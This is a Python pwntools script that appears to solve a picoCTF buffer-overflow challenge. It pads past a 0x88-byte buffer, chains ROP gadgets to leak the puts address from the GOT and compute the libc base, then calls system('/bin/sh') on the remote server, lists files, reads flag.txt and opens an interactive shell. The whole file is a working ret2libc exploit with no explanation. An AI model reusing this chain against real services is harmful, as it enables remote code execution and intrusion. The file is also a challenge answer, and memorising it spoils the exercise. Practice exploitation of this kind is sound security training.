from pwn import *

context.log_level = "Error"

context.binary = elf = ELF("./vuln")
rop = ROP(elf)
libc_elf = ELF("./libc.so.6")

io = remote("mercury.picoctf.net", 37289)

pop_rdi = 0x400913
puts_plt = 0x400540
puts_got = 0x601018
ret_addr = 0x40052E
main_addr = 0x400771

payload = flat(b"A" * 0x88, pop_rdi, puts_got, puts_plt, main_addr)
io.sendline(payload)

io.recvlines(2)
libc_base = u64(io.recvline().strip().ljust(8, b"\x00")) - libc_elf.sym.puts
print("Libc base address : ", hex(libc_base))
libc_elf.address = libc_base

# ==========================================================================

binsh_addr = next(libc_elf.search(b"/bin/sh"))
system_addr = libc_elf.sym.system

payload = flat(b"A" * 0x88, pop_rdi, binsh_addr, ret_addr, system_addr)
io.sendline(payload)
io.sendline(b"ls\ncat ./flag.txt")

# ==========================================================================

io.interactive()
